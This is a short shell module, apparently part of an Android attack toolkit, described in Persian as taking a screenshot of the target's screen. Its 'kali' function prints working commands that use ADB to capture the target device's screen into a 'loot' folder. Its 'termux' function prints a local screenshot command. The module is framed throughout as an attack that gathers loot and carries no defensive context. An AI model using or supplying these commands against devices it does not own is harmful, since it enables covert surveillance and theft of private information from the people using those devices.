DESC="گرفتن اسکرین‌شات از صفحه‌ی هدف"
REQ="ADB"
RISK="LOW"

termux(){
cat <<'EOF'
termux-screenshot /sdcard/shot.png
EOF
}

kali(){
cat <<'EOF'
mkdir -p loot
adb exec-out screencap -p > "loot/screen-$(date +%s).png"
ls -lh loot/
EOF
}
